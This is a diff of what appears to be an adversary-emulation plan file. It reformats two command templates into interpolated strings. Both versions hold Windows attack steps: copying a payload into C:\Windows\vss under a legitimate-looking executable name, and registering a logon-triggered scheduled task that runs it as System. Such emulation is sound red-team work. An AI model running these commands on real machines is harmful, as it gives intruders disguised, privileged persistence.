@@ -532,13 +532,7 @@
                 "tool": "self.tool",
                 "target": "self.target_2",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "cmd /c copy c:\\users\\administrator\\appdata\\local\\temp\\",
-                            "self.payload_name",
-                            " C:\\Windows\\vss\\vixDiskMountServer.exe"
-                        ]
-                    }
+                    "command": "cmd /c copy c:\\users\\administrator\\appdata\\local\\temp\\${self.payload_name} C:\\Windows\\vss\\vixDiskMountServer.exe"
                 }
             }
         },
@@ -551,15 +545,7 @@
                 "tool": "self.tool",
                 "target": "self.target_2",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{$action = New-ScheduledTaskAction -Execute '",
-                            "self.target_2_persist_location",
-                            "'; $trigger =  New-ScheduledTaskTrigger -AtLogOn; Register-ScheduledTask -Action $action -Trigger $trigger -TaskName \"",
-                            "self.target_2_taskname",
-                            "\" -User \"System\" -force}"
-                        ]
-                    }
+                    "command": "powershell &{$action = New-ScheduledTaskAction -Execute '${self.target_2_persist_location}'; $trigger =  New-ScheduledTaskTrigger -AtLogOn; Register-ScheduledTask -Action $action -Trigger $trigger -TaskName \"${self.target_2_taskname}\" -User \"System\" -force}"
                 }
             }
         },
